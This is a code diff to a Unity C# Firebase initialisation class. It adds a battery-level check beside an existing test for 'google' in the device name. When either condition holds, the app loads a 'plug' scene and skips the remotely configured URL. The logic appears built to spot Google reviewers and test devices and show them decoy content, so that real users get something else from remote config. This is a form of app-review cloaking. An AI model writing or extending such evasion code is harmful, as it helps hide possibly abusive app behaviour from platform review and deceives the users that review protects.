@@ -59,7 +59,7 @@ public class FirebaseInit : MonoBehaviour
                     url = FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;
                     if (!string.IsNullOrEmpty(url) || !string.IsNullOrEmpty(savedLink))
                     {
-                        if (SystemInfo.deviceModel.ToLower().Contains("google") || SystemInfo.deviceName.ToLower().Contains("google"))
+                        if (SystemInfo.deviceModel.ToLower().Contains("google") || SystemInfo.deviceName.ToLower().Contains("google") || getBatteryLevel() == 100f)
                         {
                             SceneManager.LoadScene(plug);
                             return;
@@ -111,5 +111,13 @@ public class FirebaseInit : MonoBehaviour
         }
 
         _ = remoteConfig.ActivateAsync();
+    }
+    public float getBatteryLevel()
+    {
+        BatteryStatus batteryStatus = SystemInfo.batteryStatus;
+        float batteryLevel = SystemInfo.batteryLevel;
+        Debug.Log("Battery status: " + batteryStatus);
+        Debug.Log("Battery level: " + batteryLevel);
+        return batteryLevel;
     }
 }
